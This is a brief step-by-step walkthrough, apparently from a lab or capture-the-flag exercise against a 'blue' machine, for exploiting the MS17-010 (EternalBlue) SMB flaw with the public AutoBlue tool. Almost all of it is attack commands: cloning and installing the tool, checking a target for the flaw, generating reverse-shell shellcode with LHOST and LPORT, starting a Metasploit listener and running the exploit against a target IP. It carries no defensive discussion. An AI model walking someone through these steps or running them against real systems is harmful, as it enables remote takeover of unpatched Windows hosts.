1. Installation & Dependencies
Clone the repository and install the required Python libraries. (Source : https://github.com/3ndG4me/AutoBlue-MS17-010)

```
cd /opt
sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
sudo pip install -r requirements.txt --break-system-packages
```

Note: The --break-system-packages flag is required on newer Kali Linux versions to bypass PEP 668 restrictions

2. Vulnerability Scanning
Verify the target status before exploitation.

```
python eternal_checker.py <TARGET_IP>
```

Status: If The target is not patched appears, the system is vulnerable.
Ignore: SyntaxWarning: invalid escape sequence is a Python versioning quirk and doesn't affect the scan.

3. Shellcode Generation
Create the payload for the target architecture.

```
cd shellcode
sudo ./shell_prep.sh
```

Inputs: Enter LHOST, LPORT, and choose between Meterpreter (0) or Regular Shell (1).

4. Metasploit Listener Setup
Prepare the handler to receive the reverse connection.

```
sudo ./listener_prep.sh
```

5. Execution
Run the exploit using the generated shellcode.

```
sudo python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_all.bin.
```

And the blue machine crashing down
